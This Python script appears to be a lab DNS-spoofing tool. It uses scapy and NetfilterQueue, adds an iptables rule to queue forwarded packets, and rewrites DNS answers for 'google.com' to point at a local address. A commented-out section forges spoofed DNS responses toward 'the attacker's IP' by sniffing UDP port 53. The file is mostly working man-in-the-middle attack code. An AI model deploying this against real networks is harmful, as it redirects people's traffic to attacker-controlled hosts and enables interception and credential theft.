from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
   
host_table = { "google.com" : "192.168.56.102" }


def callback(pkt):
    scapy_pkt = IP(pkt.get_payload())

    print("Working...")
    print(scapy_pkt.show())
    print(scapy_pkt.haslayer(DNSRR))
    if scapy_pkt.haslayer(DNSRR):

        print("before", scapy_pkt.summary())
        try: 
            name = scapy_pkt[DNSQR].qname
            if name not in host_table:
                pass
            else:
                scapy_pkt[DNS].an = DNSRR(rrname=name, rdata=host_table[name])
                scapy_pkt[DNS].ancount = 1
                
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[UDP].len
                del scapy_pkt[UDP].chksum

        except IndexError:
            pass

        print("After", scapy_pkt.summary())
        pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()


def dns_spoof():

    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    queue = NetfilterQueue()

    try: 
        queue.bind(0, callback)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")








#     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
#         # Check if packet is a DNS query
#         print("Received DNS request")

#         # Construct a DNS response to redirect the query to the attacker's IP
#         dns_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
#                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
#                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
#                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="192.168.56.103"))

#         # Send the crafted DNS response
#         send(dns_resp, verbose=False)
#         return "Spoofed DNS Response Sent"

# def start_spoof(interface):
#     # Start sniffing for DNS queries on the specified interface
#     sniff(filter="udp port 53", iface=interface, prn=dns_spoof)


